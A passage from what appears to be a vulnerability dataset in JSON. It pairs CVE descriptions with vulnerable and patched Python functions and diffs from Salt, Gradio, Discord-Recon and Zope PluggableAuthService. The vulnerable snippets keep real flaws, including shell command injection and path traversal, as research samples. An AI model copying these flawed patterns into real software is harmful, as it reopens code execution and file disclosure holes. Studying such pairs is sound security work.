        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/saltstack/salt",
    "patch_url": [
      "https://github.com/saltstack/salt/commit/5f8b5e1a0f23fe0f2be5b3c3e04199b57a53db5b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_327_1",
        "commit": "dd0b338",
        "file_path": "salt/crypt.py",
        "start_line": 558,
        "end_line": 664,
        "snippet": "    def sign_in(self, timeout=60, safe=True, tries=1, channel=None):\n        '''\n        Send a sign in request to the master, sets the key information and\n        returns a dict containing the master publish interface to bind to\n        and the decrypted aes key for transport decryption.\n\n        :param int timeout: Number of seconds to wait before timing out the sign-in request\n        :param bool safe: If True, do not raise an exception on timeout. Retry instead.\n        :param int tries: The number of times to try to authenticate before giving up.\n\n        :raises SaltReqTimeoutError: If the sign-in request has timed out and :param safe: is not set\n\n        :return: Return a string on failure indicating the reason for failure. On success, return a dictionary\n        with the publication port and the shared AES key.\n\n        '''\n        auth = {}\n\n        auth_timeout = self.opts.get('auth_timeout', None)\n        if auth_timeout is not None:\n            timeout = auth_timeout\n        auth_safemode = self.opts.get('auth_safemode', None)\n        if auth_safemode is not None:\n            safe = auth_safemode\n        auth_tries = self.opts.get('auth_tries', None)\n        if auth_tries is not None:\n            tries = auth_tries\n\n        m_pub_fn = os.path.join(self.opts['pki_dir'], self.mpub)\n\n        auth['master_uri'] = self.opts['master_uri']\n\n        if not channel:\n            channel = salt.transport.client.AsyncReqChannel.factory(self.opts,\n                                                                crypt='clear',\n                                                                io_loop=self.io_loop)\n\n        sign_in_payload = self.minion_sign_in_payload()\n        try:\n            payload = yield channel.send(\n                sign_in_payload,\n                tries=tries,\n                timeout=timeout\n            )\n        except SaltReqTimeoutError as e:\n            if safe:\n                log.warning('SaltReqTimeoutError: {0}'.format(e))\n                raise tornado.gen.Return('retry')\n            if self.opts.get('detect_mode') is True:\n                raise tornado.gen.Return('retry')\n            else:\n                raise SaltClientError('Attempt to authenticate with the salt master failed with timeout error')\n        if 'load' in payload:\n            if 'ret' in payload['load']:\n                if not payload['load']['ret']:\n                    if self.opts['rejected_retry']:\n                        log.error(\n                            'The Salt Master has rejected this minion\\'s public '\n                            'key.\\nTo repair this issue, delete the public key '\n                            'for this minion on the Salt Master.\\nThe Salt '\n                            'Minion will attempt to to re-authenicate.'\n                        )\n                        raise tornado.gen.Return('retry')\n                    else:\n                        log.critical(\n                            'The Salt Master has rejected this minion\\'s public '\n                            'key!\\nTo repair this issue, delete the public key '\n                            'for this minion on the Salt Master and restart this '\n                            'minion.\\nOr restart the Salt Master in open mode to '\n                            'clean out the keys. The Salt Minion will now exit.'\n                        )\n                        sys.exit(salt.defaults.exitcodes.EX_OK)\n                # has the master returned that its maxed out with minions?\n                elif payload['load']['ret'] == 'full':\n                    raise tornado.gen.Return('full')\n                else:\n                    log.error(\n                        'The Salt Master has cached the public key for this '\n                        'node, this salt minion will wait for {0} seconds '\n                        'before attempting to re-authenticate'.format(\n                            self.opts['acceptance_wait_time']\n                        )\n                    )\n                    raise tornado.gen.Return('retry')\n        auth['aes'] = self.verify_master(payload, master_pub='token' in sign_in_payload)\n        if not auth['aes']:\n            log.critical(\n                'The Salt Master server\\'s public key did not authenticate!\\n'\n                'The master may need to be updated if it is a version of Salt '\n                'lower than {0}, or\\n'\n                'If you are confident that you are connecting to a valid Salt '\n                'Master, then remove the master public key and restart the '\n                'Salt Minion.\\nThe master public key can be found '\n                'at:\\n{1}'.format(salt.version.__version__, m_pub_fn)\n            )\n            raise SaltClientError('Invalid master key')\n        if self.opts.get('syndic_master', False):  # Is syndic\n            syndic_finger = self.opts.get('syndic_finger', self.opts.get('master_finger', False))\n            if syndic_finger:\n                if salt.utils.pem_finger(m_pub_fn, sum_type=self.opts['hash_type']) != syndic_finger:\n                    self._finger_fail(syndic_finger, m_pub_fn)\n        else:\n            if self.opts.get('master_finger', False):\n                if salt.utils.pem_finger(m_pub_fn, sum_type=self.opts['hash_type']) != self.opts['master_finger']:\n                    self._finger_fail(self.opts['master_finger'], m_pub_fn)\n        auth['publish_port'] = payload['publish_port']\n        raise tornado.gen.Return(auth)"
      },
      {
        "id": "vul_py_327_2",
        "commit": "dd0b338",
        "file_path": "salt/transport/tcp.py",
        "start_line": 609,
        "end_line": 669,
        "snippet": "    def handle_message(self, stream, header, payload):\n        '''\n        Handle incoming messages from underylying tcp streams\n        '''\n        try:\n            try:\n                payload = self._decode_payload(payload)\n            except Exception:\n                stream.write(salt.transport.frame.frame_msg('bad load', header=header))\n                raise tornado.gen.Return()\n\n            # TODO helper functions to normalize payload?\n            if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n                yield stream.write(salt.transport.frame.frame_msg(\n                    'payload and load must be a dict', header=header))\n                raise tornado.gen.Return()\n\n            # intercept the \"_auth\" commands, since the main daemon shouldn't know\n            # anything about our key auth\n            if payload['enc'] == 'clear' and payload.get('load', {}).get('cmd') == '_auth':\n                yield stream.write(salt.transport.frame.frame_msg(\n                    self._auth(payload['load']), header=header))\n                raise tornado.gen.Return()\n\n            # TODO: test\n            try:\n                ret, req_opts = yield self.payload_handler(payload)\n            except Exception as e:\n                # always attempt to return an error to the minion\n                stream.write('Some exception handling minion payload')\n                log.error('Some exception handling a payload from minion', exc_info=True)\n                stream.close()\n                raise tornado.gen.Return()\n\n            req_fun = req_opts.get('fun', 'send')\n            if req_fun == 'send_clear':\n                stream.write(salt.transport.frame.frame_msg(ret, header=header))\n            elif req_fun == 'send':\n                stream.write(salt.transport.frame.frame_msg(self.crypticle.dumps(ret), header=header))\n            elif req_fun == 'send_private':\n                stream.write(salt.transport.frame.frame_msg(self._encrypt_private(ret,\n                                                             req_opts['key'],\n                                                             req_opts['tgt'],\n                                                             ), header=header))\n            else:\n                log.error('Unknown req_fun {0}'.format(req_fun))\n                # always attempt to return an error to the minion\n                stream.write('Server-side exception handling payload')\n                stream.close()\n        except tornado.gen.Return:\n            raise\n        except tornado.iostream.StreamClosedError:\n            # Stream was closed. This could happen if the remote side\n            # closed the connection on its end (eg in a timeout or shutdown\n            # situation).\n            log.error('Connection was unexpectedly closed', exc_info=True)\n        except Exception as exc:  # pylint: disable=broad-except\n            # Absorb any other exceptions\n            log.error('Unexpected exception occurred: {0}'.format(exc), exc_info=True)\n\n        raise tornado.gen.Return()"
      },
      {
        "id": "vul_py_327_3",
        "commit": "dd0b338",
        "file_path": "salt/transport/zeromq.py",
        "start_line": 567,
        "end_line": 630,
        "snippet": "    def handle_message(self, stream, payload):\n        '''\n        Handle incoming messages from underylying TCP streams\n\n        :stream ZMQStream stream: A ZeroMQ stream.\n        See http://zeromq.github.io/pyzmq/api/generated/zmq.eventloop.zmqstream.html\n\n        :param dict payload: A payload to process\n        '''\n        try:\n            payload = self.serial.loads(payload[0])\n            payload = self._decode_payload(payload)\n        except Exception as exc:\n            exc_type = type(exc).__name__\n            if exc_type == 'AuthenticationError':\n                log.debug(\n                    'Minion failed to auth to master. Since the payload is '\n                    'encrypted, it is not known which minion failed to '\n                    'authenticate. It is likely that this is a transient '\n                    'failure due to the master rotating its public key.'\n                )\n            else:\n                log.error('Bad load from minion: %s: %s', exc_type, exc)\n            stream.send(self.serial.dumps('bad load'))\n            raise tornado.gen.Return()\n\n        # TODO helper functions to normalize payload?\n        if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n            log.error('payload and load must be a dict. Payload was: {0} and load was {1}'.format(payload, payload.get('load')))\n            stream.send(self.serial.dumps('payload and load must be a dict'))\n            raise tornado.gen.Return()\n\n        # intercept the \"_auth\" commands, since the main daemon shouldn't know\n        # anything about our key auth\n        if payload['enc'] == 'clear' and payload.get('load', {}).get('cmd') == '_auth':\n            stream.send(self.serial.dumps(self._auth(payload['load'])))\n            raise tornado.gen.Return()\n\n        # TODO: test\n        try:\n            # Take the payload_handler function that was registered when we created the channel\n            # and call it, returning control to the caller until it completes\n            ret, req_opts = yield self.payload_handler(payload)\n        except Exception as e:\n            # always attempt to return an error to the minion\n            stream.send('Some exception handling minion payload')\n            log.error('Some exception handling a payload from minion', exc_info=True)\n            raise tornado.gen.Return()\n\n        req_fun = req_opts.get('fun', 'send')\n        if req_fun == 'send_clear':\n            stream.send(self.serial.dumps(ret))\n        elif req_fun == 'send':\n            stream.send(self.serial.dumps(self.crypticle.dumps(ret)))\n        elif req_fun == 'send_private':\n            stream.send(self.serial.dumps(self._encrypt_private(ret,\n                                                                req_opts['key'],\n                                                                req_opts['tgt'],\n                                                                )))\n        else:\n            log.error('Unknown req_fun {0}'.format(req_fun))\n            # always attempt to return an error to the minion\n            stream.send('Server-side exception handling payload')\n        raise tornado.gen.Return()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_327_1",
        "commit": "5f8b5e1a0f23fe0f2be5b3c3e04199b57a53db5b",
        "file_path": "salt/crypt.py",
        "start_line": 558,
        "end_line": 667,
        "snippet": "    def sign_in(self, timeout=60, safe=True, tries=1, channel=None):\n        '''\n        Send a sign in request to the master, sets the key information and\n        returns a dict containing the master publish interface to bind to\n        and the decrypted aes key for transport decryption.\n\n        :param int timeout: Number of seconds to wait before timing out the sign-in request\n        :param bool safe: If True, do not raise an exception on timeout. Retry instead.\n        :param int tries: The number of times to try to authenticate before giving up.\n\n        :raises SaltReqTimeoutError: If the sign-in request has timed out and :param safe: is not set\n\n        :return: Return a string on failure indicating the reason for failure. On success, return a dictionary\n        with the publication port and the shared AES key.\n\n        '''\n        auth = {}\n\n        auth_timeout = self.opts.get('auth_timeout', None)\n        if auth_timeout is not None:\n            timeout = auth_timeout\n        auth_safemode = self.opts.get('auth_safemode', None)\n        if auth_safemode is not None:\n            safe = auth_safemode\n        auth_tries = self.opts.get('auth_tries', None)\n        if auth_tries is not None:\n            tries = auth_tries\n\n        m_pub_fn = os.path.join(self.opts['pki_dir'], self.mpub)\n\n        auth['master_uri'] = self.opts['master_uri']\n\n        if not channel:\n            channel = salt.transport.client.AsyncReqChannel.factory(self.opts,\n                                                                crypt='clear',\n                                                                io_loop=self.io_loop)\n\n        sign_in_payload = self.minion_sign_in_payload()\n        try:\n            payload = yield channel.send(\n                sign_in_payload,\n                tries=tries,\n                timeout=timeout\n            )\n        except SaltReqTimeoutError as e:\n            if safe:\n                log.warning('SaltReqTimeoutError: {0}'.format(e))\n                raise tornado.gen.Return('retry')\n            if self.opts.get('detect_mode') is True:\n                raise tornado.gen.Return('retry')\n            else:\n                raise SaltClientError('Attempt to authenticate with the salt master failed with timeout error')\n        if not isinstance(payload, dict):\n            log.error('Sign-in attempt failed: %s', payload)\n            raise tornado.gen.Return(False)\n        if 'load' in payload:\n            if 'ret' in payload['load']:\n                if not payload['load']['ret']:\n                    if self.opts['rejected_retry']:\n                        log.error(\n                            'The Salt Master has rejected this minion\\'s public '\n                            'key.\\nTo repair this issue, delete the public key '\n                            'for this minion on the Salt Master.\\nThe Salt '\n                            'Minion will attempt to to re-authenicate.'\n                        )\n                        raise tornado.gen.Return('retry')\n                    else:\n                        log.critical(\n                            'The Salt Master has rejected this minion\\'s public '\n                            'key!\\nTo repair this issue, delete the public key '\n                            'for this minion on the Salt Master and restart this '\n                            'minion.\\nOr restart the Salt Master in open mode to '\n                            'clean out the keys. The Salt Minion will now exit.'\n                        )\n                        sys.exit(salt.defaults.exitcodes.EX_OK)\n                # has the master returned that its maxed out with minions?\n                elif payload['load']['ret'] == 'full':\n                    raise tornado.gen.Return('full')\n                else:\n                    log.error(\n                        'The Salt Master has cached the public key for this '\n                        'node, this salt minion will wait for {0} seconds '\n                        'before attempting to re-authenticate'.format(\n                            self.opts['acceptance_wait_time']\n                        )\n                    )\n                    raise tornado.gen.Return('retry')\n        auth['aes'] = self.verify_master(payload, master_pub='token' in sign_in_payload)\n        if not auth['aes']:\n            log.critical(\n                'The Salt Master server\\'s public key did not authenticate!\\n'\n                'The master may need to be updated if it is a version of Salt '\n                'lower than {0}, or\\n'\n                'If you are confident that you are connecting to a valid Salt '\n                'Master, then remove the master public key and restart the '\n                'Salt Minion.\\nThe master public key can be found '\n                'at:\\n{1}'.format(salt.version.__version__, m_pub_fn)\n            )\n            raise SaltClientError('Invalid master key')\n        if self.opts.get('syndic_master', False):  # Is syndic\n            syndic_finger = self.opts.get('syndic_finger', self.opts.get('master_finger', False))\n            if syndic_finger:\n                if salt.utils.pem_finger(m_pub_fn, sum_type=self.opts['hash_type']) != syndic_finger:\n                    self._finger_fail(syndic_finger, m_pub_fn)\n        else:\n            if self.opts.get('master_finger', False):\n                if salt.utils.pem_finger(m_pub_fn, sum_type=self.opts['hash_type']) != self.opts['master_finger']:\n                    self._finger_fail(self.opts['master_finger'], m_pub_fn)\n        auth['publish_port'] = payload['publish_port']\n        raise tornado.gen.Return(auth)"
      },
      {
        "id": "fix_py_327_2",
        "commit": "5f8b5e1a0f23fe0f2be5b3c3e04199b57a53db5b",
        "file_path": "salt/transport/tcp.py",
        "start_line": 609,
        "end_line": 680,
        "snippet": "    def handle_message(self, stream, header, payload):\n        '''\n        Handle incoming messages from underylying tcp streams\n        '''\n        try:\n            try:\n                payload = self._decode_payload(payload)\n            except Exception:\n                stream.write(salt.transport.frame.frame_msg('bad load', header=header))\n                raise tornado.gen.Return()\n\n            # TODO helper functions to normalize payload?\n            if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n                yield stream.write(salt.transport.frame.frame_msg(\n                    'payload and load must be a dict', header=header))\n                raise tornado.gen.Return()\n\n            try:\n                id_ = payload['load'].get('id', '')\n                if '\\0' in id_:\n                    log.error('Payload contains an id with a null byte: %s', payload)\n                    stream.send(self.serial.dumps('bad load: id contains a null byte'))\n                    raise tornado.gen.Return()\n            except TypeError:\n                log.error('Payload contains non-string id: %s', payload)\n                stream.send(self.serial.dumps('bad load: id {0} is not a string'.format(id_)))\n                raise tornado.gen.Return()\n\n            # intercept the \"_auth\" commands, since the main daemon shouldn't know\n            # anything about our key auth\n            if payload['enc'] == 'clear' and payload.get('load', {}).get('cmd') == '_auth':\n                yield stream.write(salt.transport.frame.frame_msg(\n                    self._auth(payload['load']), header=header))\n                raise tornado.gen.Return()\n\n            # TODO: test\n            try:\n                ret, req_opts = yield self.payload_handler(payload)\n            except Exception as e:\n                # always attempt to return an error to the minion\n                stream.write('Some exception handling minion payload')\n                log.error('Some exception handling a payload from minion', exc_info=True)\n                stream.close()\n                raise tornado.gen.Return()\n\n            req_fun = req_opts.get('fun', 'send')\n            if req_fun == 'send_clear':\n                stream.write(salt.transport.frame.frame_msg(ret, header=header))\n            elif req_fun == 'send':\n                stream.write(salt.transport.frame.frame_msg(self.crypticle.dumps(ret), header=header))\n            elif req_fun == 'send_private':\n                stream.write(salt.transport.frame.frame_msg(self._encrypt_private(ret,\n                                                             req_opts['key'],\n                                                             req_opts['tgt'],\n                                                             ), header=header))\n            else:\n                log.error('Unknown req_fun {0}'.format(req_fun))\n                # always attempt to return an error to the minion\n                stream.write('Server-side exception handling payload')\n                stream.close()\n        except tornado.gen.Return:\n            raise\n        except tornado.iostream.StreamClosedError:\n            # Stream was closed. This could happen if the remote side\n            # closed the connection on its end (eg in a timeout or shutdown\n            # situation).\n            log.error('Connection was unexpectedly closed', exc_info=True)\n        except Exception as exc:  # pylint: disable=broad-except\n            # Absorb any other exceptions\n            log.error('Unexpected exception occurred: {0}'.format(exc), exc_info=True)\n\n        raise tornado.gen.Return()"
      },
      {
        "id": "fix_py_327_3",
        "commit": "5f8b5e1a0f23fe0f2be5b3c3e04199b57a53db5b",
        "file_path": "salt/transport/zeromq.py",
        "start_line": 567,
        "end_line": 641,
        "snippet": "    def handle_message(self, stream, payload):\n        '''\n        Handle incoming messages from underylying TCP streams\n\n        :stream ZMQStream stream: A ZeroMQ stream.\n        See http://zeromq.github.io/pyzmq/api/generated/zmq.eventloop.zmqstream.html\n\n        :param dict payload: A payload to process\n        '''\n        try:\n            payload = self.serial.loads(payload[0])\n            payload = self._decode_payload(payload)\n        except Exception as exc:\n            exc_type = type(exc).__name__\n            if exc_type == 'AuthenticationError':\n                log.debug(\n                    'Minion failed to auth to master. Since the payload is '\n                    'encrypted, it is not known which minion failed to '\n                    'authenticate. It is likely that this is a transient '\n                    'failure due to the master rotating its public key.'\n                )\n            else:\n                log.error('Bad load from minion: %s: %s', exc_type, exc)\n            stream.send(self.serial.dumps('bad load'))\n            raise tornado.gen.Return()\n\n        # TODO helper functions to normalize payload?\n        if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n            log.error('payload and load must be a dict. Payload was: {0} and load was {1}'.format(payload, payload.get('load')))\n            stream.send(self.serial.dumps('payload and load must be a dict'))\n            raise tornado.gen.Return()\n\n        try:\n            id_ = payload['load'].get('id', '')\n            if '\\0' in id_:\n                log.error('Payload contains an id with a null byte: %s', payload)\n                stream.send(self.serial.dumps('bad load: id contains a null byte'))\n                raise tornado.gen.Return()\n        except TypeError:\n            log.error('Payload contains non-string id: %s', payload)\n            stream.send(self.serial.dumps('bad load: id {0} is not a string'.format(id_)))\n            raise tornado.gen.Return()\n\n        # intercept the \"_auth\" commands, since the main daemon shouldn't know\n        # anything about our key auth\n        if payload['enc'] == 'clear' and payload.get('load', {}).get('cmd') == '_auth':\n            stream.send(self.serial.dumps(self._auth(payload['load'])))\n            raise tornado.gen.Return()\n\n        # TODO: test\n        try:\n            # Take the payload_handler function that was registered when we created the channel\n            # and call it, returning control to the caller until it completes\n            ret, req_opts = yield self.payload_handler(payload)\n        except Exception as e:\n            # always attempt to return an error to the minion\n            stream.send('Some exception handling minion payload')\n            log.error('Some exception handling a payload from minion', exc_info=True)\n            raise tornado.gen.Return()\n\n        req_fun = req_opts.get('fun', 'send')\n        if req_fun == 'send_clear':\n            stream.send(self.serial.dumps(ret))\n        elif req_fun == 'send':\n            stream.send(self.serial.dumps(self.crypticle.dumps(ret)))\n        elif req_fun == 'send_private':\n            stream.send(self.serial.dumps(self._encrypt_private(ret,\n                                                                req_opts['key'],\n                                                                req_opts['tgt'],\n                                                                )))\n        else:\n            log.error('Unknown req_fun {0}'.format(req_fun))\n            # always attempt to return an error to the minion\n            stream.send('Server-side exception handling payload')\n        raise tornado.gen.Return()"
      }
    ],
    "vul_patch": "--- a/salt/crypt.py\n+++ b/salt/crypt.py\n@@ -50,6 +50,9 @@\n                 raise tornado.gen.Return('retry')\n             else:\n                 raise SaltClientError('Attempt to authenticate with the salt master failed with timeout error')\n+        if not isinstance(payload, dict):\n+            log.error('Sign-in attempt failed: %s', payload)\n+            raise tornado.gen.Return(False)\n         if 'load' in payload:\n             if 'ret' in payload['load']:\n                 if not payload['load']['ret']:\n\n--- a/salt/transport/tcp.py\n+++ b/salt/transport/tcp.py\n@@ -13,6 +13,17 @@\n             if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n                 yield stream.write(salt.transport.frame.frame_msg(\n                     'payload and load must be a dict', header=header))\n+                raise tornado.gen.Return()\n+\n+            try:\n+                id_ = payload['load'].get('id', '')\n+                if '\\0' in id_:\n+                    log.error('Payload contains an id with a null byte: %s', payload)\n+                    stream.send(self.serial.dumps('bad load: id contains a null byte'))\n+                    raise tornado.gen.Return()\n+            except TypeError:\n+                log.error('Payload contains non-string id: %s', payload)\n+                stream.send(self.serial.dumps('bad load: id {0} is not a string'.format(id_)))\n                 raise tornado.gen.Return()\n \n             # intercept the \"_auth\" commands, since the main daemon shouldn't know\n\n--- a/salt/transport/zeromq.py\n+++ b/salt/transport/zeromq.py\n@@ -28,6 +28,17 @@\n         if not isinstance(payload, dict) or not isinstance(payload.get('load'), dict):\n             log.error('payload and load must be a dict. Payload was: {0} and load was {1}'.format(payload, payload.get('load')))\n             stream.send(self.serial.dumps('payload and load must be a dict'))\n+            raise tornado.gen.Return()\n+\n+        try:\n+            id_ = payload['load'].get('id', '')\n+            if '\\0' in id_:\n+                log.error('Payload contains an id with a null byte: %s', payload)\n+                stream.send(self.serial.dumps('bad load: id contains a null byte'))\n+                raise tornado.gen.Return()\n+        except TypeError:\n+            log.error('Payload contains non-string id: %s', payload)\n+            stream.send(self.serial.dumps('bad load: id {0} is not a string'.format(id_)))\n             raise tornado.gen.Return()\n \n         # intercept the \"_auth\" commands, since the main daemon shouldn't know\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-43831",
    "cve_description": "Gradio is an open source framework for building interactive machine learning models and demos. In versions prior to 2.5.0 there is a vulnerability that affects anyone who creates and publicly shares Gradio interfaces. File paths are not restricted and users who receive a Gradio link can access any files on the host computer if they know the file names or file paths. This is limited only by the host operating system. Paths are opened in read only mode. The problem has been patched in gradio 2.5.0.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gradio-app/gradio",
    "patch_url": [
      "https://github.com/gradio-app/gradio/commit/41bd3645bdb616e1248b2167ca83636a2653f781"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_127_1",
        "commit": "0b2c490",
        "file_path": "gradio/networking.py",
        "start_line": 379,
        "end_line": 388,
        "snippet": "def file(path):\n    path = secure_filename(path)\n    if app.interface.encrypt and isinstance(app.interface.examples, str) and path.startswith(app.interface.examples):\n        with open(os.path.join(app.cwd, path), \"rb\") as encrypted_file:\n            encrypted_data = encrypted_file.read()\n        file_data = encryptor.decrypt(\n            app.interface.encryption_key, encrypted_data)\n        return send_file(io.BytesIO(file_data), attachment_filename=os.path.basename(path))\n    else:\n        return send_file(os.path.join(app.cwd, path))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_127_1",
        "commit": "41bd364",
        "file_path": "gradio/networking.py",
        "start_line": 379,
        "end_line": 387,
        "snippet": "def file(path):\n    if app.interface.encrypt and isinstance(app.interface.examples, str) and path.startswith(app.interface.examples):\n        with open(safe_join(app.cwd, path), \"rb\") as encrypted_file:\n            encrypted_data = encrypted_file.read()\n        file_data = encryptor.decrypt(\n            app.interface.encryption_key, encrypted_data)\n        return send_file(io.BytesIO(file_data), attachment_filename=os.path.basename(path))\n    else:\n        return send_file(safe_join(app.cwd, path))"
      }
    ],
    "vul_patch": "--- a/gradio/networking.py\n+++ b/gradio/networking.py\n@@ -1,10 +1,9 @@\n def file(path):\n-    path = secure_filename(path)\n     if app.interface.encrypt and isinstance(app.interface.examples, str) and path.startswith(app.interface.examples):\n-        with open(os.path.join(app.cwd, path), \"rb\") as encrypted_file:\n+        with open(safe_join(app.cwd, path), \"rb\") as encrypted_file:\n             encrypted_data = encrypted_file.read()\n         file_data = encryptor.decrypt(\n             app.interface.encryption_key, encrypted_data)\n         return send_file(io.BytesIO(file_data), attachment_filename=os.path.basename(path))\n     else:\n-        return send_file(os.path.join(app.cwd, path))\n+        return send_file(safe_join(app.cwd, path))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-21663",
    "cve_description": "Discord-Recon is a Discord bot created to automate bug bounty recon, automated scans and information gathering via a discord server. Discord-Recon is vulnerable to remote code execution. An attacker is able to execute shell commands in the server without having an admin role. This vulnerability has been fixed in version 0.0.8.\n",
    "cwe_info": {
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/DEMON1A/Discord-Recon",
    "patch_url": [
      "https://github.com/DEMON1A/Discord-Recon/commit/f9cb0f67177f5e2f1022295ca8e641e47837ec7a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_212_1",
        "commit": "741dc39",
        "file_path": "app.py",
        "start_line": 159,
        "end_line": 175,
        "snippet": "async def prips(ctx, *, argument):\n    Output = subprocess.Popen(f\"prips {argument}\", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)\n    Output = Output.communicate()[0].decode('UTF-8')\n\n    if len(Output) > 2000:\n        RandomStr = utilities.generate_random_string()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output)\n            Message.close()\n\n            await ctx.send(\"Prips Results: \", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n    else:\n        await ctx.send(\"**Prips Results:**\")\n        await ctx.send(f\"```{Output}```\")\n        await ctx.send(f\"\\n**- {ctx.message.author}**\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_212_1",
        "commit": "f9cb0f6",
        "file_path": "app.py",
        "start_line": 159,
        "end_line": 176,
        "snippet": "async def prips(ctx, *, argument):\n    argument = CommandInjection.sanitizeInput(argument)\n    Output = subprocess.Popen(f\"prips {argument}\", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)\n    Output = Output.communicate()[0].decode('UTF-8')\n\n    if len(Output) > 2000:\n        RandomStr = utilities.generate_random_string()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output)\n            Message.close()\n\n            await ctx.send(f\"Prips output for **{argument}**: \", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\nRequested by **{ctx.message.author}**\")\n    else:\n        await ctx.send(f\"Prips output for **{argument}:**\")\n        await ctx.send(f\"```{Output}```\")\n        await ctx.send(f\"\\nRequested by **{ctx.message.author}**\")"
      }
    ],
    "vul_patch": "--- a/app.py\n+++ b/app.py\n@@ -1,4 +1,5 @@\n async def prips(ctx, *, argument):\n+    argument = CommandInjection.sanitizeInput(argument)\n     Output = subprocess.Popen(f\"prips {argument}\", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)\n     Output = Output.communicate()[0].decode('UTF-8')\n \n@@ -9,9 +10,9 @@\n             Message.write(Output)\n             Message.close()\n \n-            await ctx.send(\"Prips Results: \", file=discord.File(f\"messages/{RandomStr}\"))\n-            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n+            await ctx.send(f\"Prips output for **{argument}**: \", file=discord.File(f\"messages/{RandomStr}\"))\n+            await ctx.send(f\"\\nRequested by **{ctx.message.author}**\")\n     else:\n-        await ctx.send(\"**Prips Results:**\")\n+        await ctx.send(f\"Prips output for **{argument}:**\")\n         await ctx.send(f\"```{Output}```\")\n-        await ctx.send(f\"\\n**- {ctx.message.author}**\")\n+        await ctx.send(f\"\\nRequested by **{ctx.message.author}**\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21336",
    "cve_description": "Products.PluggableAuthService is a pluggable Zope authentication and authorization framework. In Products.PluggableAuthService before version 2.6.0 there is an information disclosure vulnerability - everyone can list the names of roles defined in the ZODB Role Manager plugin if the site uses this plugin. The problem has been fixed in version 2.6.0. Depending on how you have installed Products.PluggableAuthService, you should change the buildout version pin to 2.6.0 and re-run the buildout, or if you used pip simply do `pip install \"Products.PluggableAuthService>=2.6.0\"`.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/zopefoundation/Products.PluggableAuthService",
    "patch_url": [
      "https://github.com/zopefoundation/Products.PluggableAuthService/commit/2dad81128250cb2e5d950cddc9d3c0314a80b4bb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_91_1",
        "commit": "7eead06",
        "file_path": "src/Products/PluggableAuthService/plugins/ZODBRoleManager.py",
        "start_line": "115",
        "end_line": "153",
        "snippet": "    def enumerateRoles(self, id=None, exact_match=False, sort_by=None,\n                       max_results=None, **kw):\n        \"\"\" See IRoleEnumerationPlugin.\n        \"\"\"\n        role_info = []\n        role_ids = []\n        plugin_id = self.getId()\n\n        if isinstance(id, str):\n            id = [id]\n\n        if exact_match and (id):\n            role_ids.extend(id)\n\n        if role_ids:\n            role_filter = None\n\n        else:   # Searching\n            role_ids = self.listRoleIds()\n            role_filter = _ZODBRoleFilter(id, **kw)\n\n        for role_id in role_ids:\n\n            if self._roles.get(role_id):\n                e_url = '%s/manage_roles' % self.getId()\n                p_qs = 'role_id=%s' % role_id\n                m_qs = 'role_id=%s&assign=1' % role_id\n\n                info = {}\n                info.update(self._roles[role_id])\n\n                info['pluginid'] = plugin_id\n                info['properties_url'] = '%s?%s' % (e_url, p_qs)\n                info['members_url'] = '%s?%s' % (e_url, m_qs)\n\n                if not role_filter or role_filter(info):\n                    role_info.append(info)\n\n        return tuple(role_info)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_91_1",
        "commit": "2dad811",
        "file_path": "src/Products/PluggableAuthService/plugins/ZODBRoleManager.py",
        "start_line": "115",
        "end_line": "154",
